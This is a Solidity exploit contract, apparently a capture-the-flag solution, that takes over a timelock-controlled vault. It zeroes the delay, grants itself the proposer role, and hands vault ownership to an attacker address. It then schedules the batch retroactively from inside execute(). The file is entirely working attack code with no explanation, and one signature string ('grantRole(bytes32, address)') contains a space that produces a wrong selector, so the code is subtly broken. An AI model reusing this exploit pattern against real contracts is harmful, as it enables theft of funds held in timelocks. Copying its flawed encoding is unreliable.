//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IClimberTimeLock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberAttack {
    address[] private target;
    bytes[] private dataElements;
    uint256[] private values;
    bytes32 private salt;
    IClimberTimeLock private timeLockContract;
    address private vault;
    address private attacker;

    constructor(address _timeLockContract, address _vault, address _attacker){
        timeLockContract = IClimberTimeLock(_timeLockContract);
        vault = _vault;
        attacker = _attacker;
    }

    function attack() external {
        target.push(address(timeLockContract));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // _setupRole(PROPOSER_ROLE, proposer);
         
        target.push(address(timeLockContract));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32, address)", keccak256("PROPOSER_ROLE"), address(this)));

        target.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

        target.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        salt = keccak256("SALT");

        timeLockContract.execute(target, values, dataElements, salt);

    }

    function schedule() public {
        timeLockContract.schedule(target, values, dataElements, salt);
    }

}
